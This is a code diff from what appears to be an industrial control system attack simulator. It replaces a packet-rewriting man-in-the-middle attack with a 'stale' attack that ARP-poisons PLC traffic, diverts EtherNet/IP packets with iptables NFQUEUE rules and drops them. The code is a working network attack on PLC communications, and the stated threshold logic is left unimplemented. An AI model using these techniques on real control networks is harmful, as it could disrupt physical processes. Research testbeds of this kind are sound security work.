@@ -14,24 +14,14 @@ from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp, \
 from dhalsim.network_attacks.synced_attack import SyncedAttack
 
 
-class PacketAttack(SyncedAttack):
+class SimpleStaleAttack(SyncedAttack):
     """
-    This is a Naive Man In The Middle attack. This  attack will modify
-    the data that is passed around in tcp packets on the network, in order to
-    change the values of tags before they reach the requesting PLC.
-
-    It does this by capturing the responses of the the target plc, and changing
-    some bytes in the TCP packet so that the value is a different value.
-
-    When preforming this attack, you can use either an offset, or an absolute value.
-
-    When using this type of attack, all the responses of the PLC are modified.
-    You cannot modify the values of individual tags.
+    This is a simple Stale Attack. This  attack will stop forwarding tank level packets when a certain threshold
+    is achieved and the tank level values are increasing or decreasing.
 
     :param intermediate_yaml_path: The path to the intermediate YAML file
     :param yaml_index: The index of the attack in the intermediate YAML
     """
-
     def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
         super().__init__(intermediate_yaml_path, yaml_index)
         os.system('sysctl net.ipv4.ip_forward=1')
@@ -39,6 +29,12 @@ class PacketAttack(SyncedAttack):
         self.q = None
         self.thread = None
         self.run_thread = False
+
+    def attack_step(self):
+        """
+        When the attack is running we will decide to drop or forward the message
+        """
+        pass
 
     def setup(self):
         """
@@ -53,8 +49,8 @@ class PacketAttack(SyncedAttack):
 
         Finally, it launches the thread that will examine all captured packets.
         """
-        os.system(
-            f'iptables -t mangle -A FORWARD -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE --queue-num 1')
+        os.system('iptables -t mangle -A PREROUTING -p tcp --sport 44818 -j NFQUEUE --queue-num 1')
+        os.system('iptables -t mangle -A PREROUTING -p tcp --dport 44818 -j NFQUEUE --queue-num 1')
         os.system('iptables -A FORWARD -p icmp -j DROP')
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
@@ -66,7 +62,7 @@ class PacketAttack(SyncedAttack):
                 if plc['name'] != self.intermediate_plc['name']:
                     launch_arp_poison(self.target_plc_ip, plc['local_ip'])
 
-        self.logger.debug(f"Naive MITM Attack ARP Poison between {self.target_plc_ip} and "
+        self.logger.info(f"Simple Stale MiTM Attack ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
         try:
@@ -88,33 +84,16 @@ class PacketAttack(SyncedAttack):
         in between 100 and 116, we are dealing with a CIP packet. We then change the payload of that
         packet and delete the original checksum.
         """
+        self.logger.info('Testing')
+        os.system('sysctl -w net.ipv4.ip_forward=1')
         while self.run_thread:
             try:
                 for packet in self.queue:
-                    p = IP(packet.payload)
-                    # Packets with 100 <= length < 116 are CIP response packets
-                    if 100 <= p[IP].len < 116:
-                        if 'value' in self.intermediate_attack.keys():
-                            p[Raw].load = translate_float_to_payload(
-                                self.intermediate_attack['value'], p[Raw].load)
-                        elif 'offset' in self.intermediate_attack.keys():
-                            p[Raw].load = translate_float_to_payload(
-                                translate_payload_to_float(p[Raw].load) + self.intermediate_attack[
-                                    'offset'], p[Raw].load)
-
-                        del p[TCP].chksum
-                        del p[IP].chksum
-
-                        packet.payload = bytes(p)
-                        self.logger.debug(f"Value of network packet for {p[IP].dst} overwritten.")
-
-                    packet.mangle()
-
+                    packet.drop()
             except fnfqueue.BufferOverflowException:
-                print("Buffer Overflow in a MITM attack!")
+                self.logger.error("Buffer Overflow in a MITM attack!")
             except Exception as exc:
-                print("Exception in a MITM attack!:", exc)
-                print(traceback.format_exc())
+                self.logger.error("Exception in a MITM attack!:", exc)
 
     def interrupt(self):
         """
@@ -131,17 +110,18 @@ class PacketAttack(SyncedAttack):
         It first restores the arp poison, to point to the original router and PLC again. Afterwards
         it will delete the iptable rules and stop the thread.
         """
+        os.system('sysctl -w net.ipv4.ip_forward=1')
         restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
         if self.intermediate_yaml['network_topology_type'] == "simple":
             for plc in self.intermediate_yaml['plcs']:
                 if plc['name'] != self.intermediate_plc['name']:
                     restore_arp(self.target_plc_ip, plc['local_ip'])
 
-        self.logger.debug(f"Naive MITM Attack ARP Restore between {self.target_plc_ip} and "
+        self.logger.info(f"Stop Simple Stale MiTM Attack ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-        os.system(
-            f'iptables -t mangle -D FORWARD -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE --queue-num 1')
+        os.system('iptables -t mangle -D PREROUTING -p tcp --sport 44818 -j NFQUEUE --queue-num 1')
+        os.system('iptables -t mangle -D PREROUTING -p tcp --dport 44818 -j NFQUEUE --queue-num 1')
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
         os.system('iptables -D OUTPUT -p icmp -j DROP')
@@ -151,10 +131,6 @@ class PacketAttack(SyncedAttack):
         time.sleep(0.5)
         self.queue.close()
         self.thread.join()
-
-    def attack_step(self):
-        """This function just passes, as there is no required action in an attack step."""
-        pass
 
 
 def is_valid_file(parser_instance, arg):
@@ -176,7 +152,7 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    attack = PacketAttack(
+    attack = SimpleStaleAttack(
         intermediate_yaml_path=Path(args.intermediate_yaml),
         yaml_index=args.index)
     attack.main_loop()
